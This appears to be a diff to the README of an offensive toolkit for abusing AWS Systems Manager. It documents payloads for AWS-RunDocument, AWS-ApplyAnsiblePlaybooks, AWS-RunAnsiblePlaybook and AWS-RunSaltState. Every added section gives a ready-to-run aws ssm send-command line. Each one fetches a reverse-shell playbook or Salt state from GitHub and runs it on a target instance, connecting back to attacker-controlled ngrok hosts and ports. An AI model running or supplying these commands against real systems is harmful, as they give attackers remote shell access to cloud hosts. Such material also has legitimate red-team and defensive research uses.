@@ -13,6 +13,8 @@ All the payloads are parametereized. Below you can find examples on how to use t
 
 ##  AWS-RunDocument
 
+Downloads an SSM document from remote location and executes it on the remote host.
+
 ### cross-platform/Execute-Commands
 
 Type: Arbitrary command execution
@@ -75,4 +77,76 @@ Usage:
 aws ssm send-command --document-name "AWS-RunDocument" \
   --instance-id i-06ae9883fe6e5d721 \
   --parameters '{"sourceType":["GitHub"],"sourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"fun-with-ssm\", \"path\":\"AWS-RunDocument/linux/Reverse-Shell-Python\",\"getOptions\":\"branch:main\"}"], "documentParameters":["{\"host\":\"2.tcp.eu.ngrok.io\",\"port\":\"11448\"}"]}'
+```
+
+## AWS-ApplyAnsiblePlaybooks
+
+Installs Ansible, downloads an Ansible Playbook from a remote location and executes it on the remote host.
+
+### linux/reverse_shell.yml
+
+Type: Parameterized reverse shell using bash TCP
+
+Target OS: Linux
+
+Parameters:
+- `host`: Attacker's host 
+  - Mandatory: yes 
+- `port`: Attacker's port
+  - Mandatory: yes
+
+Usage:
+
+```bash
+aws ssm send-command --document-name "AWS-ApplyAnsiblePlaybooks" \
+  --instance-id i-0ecad5485f77f18f4 \
+  --parameters '{"SourceType":["GitHub"],"SourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"fun-with-ssm\",\"path\":\"AWS-ApplyAnsiblePlaybooks/linux/\", \"getOptions\":\"branch:main\"}"],"InstallDependencies":["True"],"PlaybookFile":["reverse_shell.yml"],"ExtraVariables":["host=6.tcp.eu.ngrok.io port=13012"]}'
+```
+
+## AWS-RunAnsiblePlaybook
+
+Downloads an Ansible Playbook from a remote location and executes it on the remote host. Ansible needs to be already installed.
+
+### linux/reverse_shell.yml
+
+Type: Parameterized reverse shell using bash TCP
+
+Target OS: Linux
+
+Parameters:
+- `host`: Attacker's host 
+  - Mandatory: yes 
+- `port`: Attacker's port
+  - Mandatory: yes
+  
+Usage:
+
+```bash
+aws ssm send-command --document-name "AWS-RunAnsiblePlaybook" \
+  --instance-id i-0ecad5485f77f18f4 \
+  --parameters '{"playbookurl":["https://raw.githubusercontent.com/saw-your-packet/fun-with-ssm/main/AWS-RunAnsiblePlaybook/linux/reverse_shell.yml"],"extravars":["host=7.tcp.eu.ngrok.io port=14355"]}'
+```
+
+## AWS-RunSaltState
+
+Download a Salt State from a remote location and executes it on the remote host. Requires Salt Stack to be already installed.
+
+### linux/reverse_shell.yml
+
+Type: Parameterized reverse shell using bash TCP
+
+Target OS: Linux
+
+Parameters:
+- `host`: Attacker's host 
+  - Mandatory: yes 
+- `port`: Attacker's port
+  - Mandatory: yes
+
+Usage:
+
+```bash
+aws ssm send-command --document-name AWS-RunSaltState \
+  --instance-id i-06ae9883fe6e5d721 \
+  --parameters '{"stateurl":["https://raw.githubusercontent.com/saw-your-packet/fun-with-ssm/main/AWS-RunSaltState/linux/reverse_shell.yml"], "pillars":["{\"host\":\"7.tcp.eu.ngrok.io\", \"port\":\"14460\"}"]}'
 ```
